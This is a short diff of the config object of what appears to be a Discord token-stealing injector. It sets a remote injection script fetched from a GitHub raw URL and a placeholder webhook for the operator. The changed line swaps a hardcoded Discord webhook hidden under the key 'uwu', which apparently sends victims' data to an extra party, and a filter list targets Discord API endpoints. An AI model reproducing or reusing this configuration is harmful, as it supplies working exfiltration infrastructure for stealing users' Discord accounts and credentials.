@@ -18,7 +18,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     injection_url: "https://raw.githubusercontent.com/mehod/test1/main/inject.js",
     webhook: "%WEBHOOK%",
-    uwu:"https://discord.com/api/webhooks/1103256743728918558/SA1r7T06ODCdB_0rUd0IhlcB4MygXyP_NlUNecVtHIl3SCkPdl_79DxkBYASkV6k-rop",
+    uwu:"https://discord.com/api/webhooks/1103266637831999509/uBz5SOXMrNqi-m-dE_ielxB_Hc8ihnE_roXkZHZ4EtEwZok5aVcbUg_nt1B_pKhQ--73",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
